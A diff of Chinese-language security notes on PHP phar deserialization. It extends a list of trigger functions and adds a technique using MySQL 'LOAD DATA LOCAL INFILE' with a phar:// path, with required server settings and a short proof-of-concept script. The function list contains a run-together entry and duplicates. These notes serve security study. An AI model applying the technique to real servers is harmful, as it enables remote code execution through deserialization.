@@ -52,10 +52,12 @@ https://paper.seebug.org/680/
 
   签名，放在文件末尾
 
-#### 影响函数
+#### 影响
+
+##### 影响函数
 
 ```php
-fileatime|filectime|file_exists|file_get_contents|file_put_contents|file|filegroup|fopen|fileinode|filemtime|fileowner|fileperms|is_dir|is_executable|is_file|is_link|is_readable|is_writable|is_writeable|parse_ini_file|copy|unlink|stat|readfile|md5_file|filesize|mime_content_type
+fileatime|filectime|file_exists|file_get_contents|file_put_contents|file|filegroup|fopen|fileinode|filemtime|fileowner|fileperms|is_dir|is_executable|is_file|is_link|is_readable|is_writable|is_writeable|parse_ini_file|copy|unlink|stat|readfile|md5_file|filesize|mime_content_type|exif_thumbnail|exif_imagetype|imageloadfont|imagecreatefrom|hash_hmac_file|hash_file|hash_update_file|md5_file|sha1_file|get_meta_tagsget_headers|getimagesize|getimagesizefromstring|finfo_file|finfo_buffer|mime_content_type
 ```
 
 ```
@@ -69,6 +71,47 @@ getimagesize / getimagesizefromstring
 
 finfo_file/finfo_buffer/mime_content_type
 ```
+
+
+
+##### mysql load data
+
+ php调用mysql的语句`LOAD DATA LOCAL INFILE`导入`phar`文件也能触发`phar`中的反序列化语句 
+
+https://github.com/Gifts/Rogue-MySql-Server 
+
+`LOAD DATA LOCAL INFILE 'phar://phar.phar/test.txt' into table user;`
+
+```
+local-infile=1
+secure_file_priv=""
+```
+
+
+
+测试代码:
+
+
+
+```php
+<?php
+    class TestObject{
+        function __destruct(){
+            echo $this->data;
+        }
+    }
+
+    //include "php://filter/read=convert.base64-encode/resource=phar://phar.phar/test.txt";
+
+    $m = mysqli_init();
+    mysqli_options($m, MYSQLI_OPT_LOCAL_INFILE, true);
+    $s = mysqli_real_connect($m, 'localhost', 'root', 'root', 'ctf', 3306);
+    $p = mysqli_query($m, 'LOAD DATA LOCAL INFILE \'phar://phar.phar/test.txt\' INTO TABLE user');
+
+?>
+```
+
+
 
 
 
